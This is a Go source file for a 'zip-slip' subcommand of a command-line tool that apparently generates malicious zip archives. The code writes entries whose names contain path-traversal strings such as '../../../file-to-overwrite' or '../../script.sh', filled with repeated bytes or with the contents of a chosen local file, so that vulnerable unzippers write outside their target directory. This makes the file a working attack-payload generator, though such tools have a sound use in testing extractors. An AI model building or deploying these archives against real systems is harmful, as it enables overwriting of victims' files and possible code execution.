package cmd

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"io/fs"
	"os"
	"time"

	"github.com/hupe1980/zipbomb/pkg/zipbomb"
	"github.com/spf13/cobra"
	"github.com/vbauerster/mpb/v8"
	"github.com/vbauerster/mpb/v8/decor"
)

type zipSlipOptions struct {
	verify           bool
	kernelBytes      []byte
	kernelRepeats    int
	compressionLevel int
	zipSlips         []string
	zipSlipFiles     map[string]string
}

func newZipSlipCmd(rootOpts *rootOptions) *cobra.Command {
	opts := &zipSlipOptions{}
	cmd := &cobra.Command{
		Use:   "zip-slip",
		Short: "Create a zip-slip",
		Example: `- zipbomb zip-slip --zip-slip "../../../file-to-overwrite" --verify
- zipbomb zip-slip --zip-slip-file "../../script.sh"="./template.sh" -- verify`,
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			creatingStart := time.Now()

			p := mpb.New(mpb.ContainerOptional(mpb.WithOutput(os.Stderr), true))

			archive, err := os.Create(rootOpts.output)
			if err != nil {
				return err
			}

			defer archive.Close()

			name := fmt.Sprintf("[i] Creating %s", archive.Name())
			numFiles := len(opts.zipSlips) + len(opts.zipSlipFiles)

			bar := p.AddBar(int64(numFiles),
				mpb.PrependDecorators(
					decor.Name(name, decor.WC{W: len(name) + 1, C: decor.DidentRight}),
					decor.OnComplete(decor.AverageETA(decor.ET_STYLE_GO, decor.WC{W: 4}), "done"),
				),
				mpb.AppendDecorators(decor.Percentage()),
			)

			zbomb, err := zipbomb.New(archive)
			if err != nil {
				return err
			}

			for _, i := range opts.zipSlips {
				kb := bytes.Repeat(opts.kernelBytes, opts.kernelRepeats)

				if err = zbomb.AddZipSlip(kb, i, func(o *zipbomb.ZipSlipOptions) {
					o.CompressionLevel = opts.compressionLevel
					o.Method = zipbomb.Deflate
				}); err != nil {
					return err
				}

				bar.Increment()
			}

			for k, v := range opts.zipSlipFiles {
				var fb []byte
				fb, err = os.ReadFile(v)
				if err != nil {
					return err
				}

				var finfo fs.FileInfo
				finfo, err = os.Stat(v)
				if err != nil {
					return err
				}

				if err = zbomb.AddZipSlip(fb, k, func(o *zipbomb.ZipSlipOptions) {
					o.CompressionLevel = opts.compressionLevel
					o.Method = zipbomb.Deflate
					o.FileMode = finfo.Mode()
				}); err != nil {
					return err
				}

				bar.Increment()
			}

			if err = zbomb.Close(); err != nil {
				return err
			}

			p.Wait()

			creatingEnd := time.Now()

			if err = printStats(archive.Name(), creatingEnd.Sub(creatingStart), zbomb); err != nil {
				return err
			}

			if opts.verify {
				verifyingStart := time.Now()

				p := mpb.New(mpb.ContainerOptional(mpb.WithOutput(os.Stderr), true))

				r, err := zip.OpenReader(archive.Name())
				if err != nil {
					return err
				}

				name := fmt.Sprintf("[i] Verifying %s", archive.Name())
				bar := p.AddBar(int64(len(r.File)),
					mpb.PrependDecorators(
						decor.Name(name, decor.WC{W: len(name) + 1, C: decor.DidentRight}),
						decor.OnComplete(decor.AverageETA(decor.ET_STYLE_GO, decor.WC{W: 4}), "done"),
					),
					mpb.AppendDecorators(decor.Percentage()),
				)

				var files []string

				for _, file := range r.File {
					fr, err := file.Open()
					if err != nil {
						return err
					}

					files = append(files, fmt.Sprintf("- %s [%s]", file.Name, file.Mode()))

					for {
						_, err := io.CopyN(io.Discard, fr, 1024)
						if err != nil {
							if err == io.EOF {
								break
							}
							return err
						}
					}

					fr.Close()

					bar.Increment()
				}

				p.Wait()

				verifyingEnd := time.Now()

				emptyLine()
				fmt.Fprintf(os.Stderr, "ZipSlips:\n")
				for _, file := range files {
					fmt.Fprintf(os.Stderr, "%s\n", file)
				}

				emptyLine()
				printInfof("Zip bomb verified!")
				printInfof("Verifying time elapsed: %s\n", verifyingEnd.Sub(verifyingStart))
			}

			return nil
		},
	}

	cmd.Flags().BoolVarP(&opts.verify, "verify", "", false, "verify zip archive")
	cmd.Flags().BytesHexVarP(&opts.kernelBytes, "kernel-bytes", "B", []byte{'B'}, "kernel bytes")
	cmd.Flags().IntVarP(&opts.kernelRepeats, "kernel-repeats", "R", 1024*1024, "kernel repeats")
	cmd.Flags().IntVarP(&opts.compressionLevel, "compression-level", "L", 5, "compression-level [-2, 9]")
	cmd.Flags().StringSliceVarP(&opts.zipSlips, "zip-slip", "", nil, "zip slip with kernel bytes")
	cmd.Flags().StringToStringVarP(&opts.zipSlipFiles, "zip-slip-file", "", nil, "zip slip with file content")

	return cmd
}
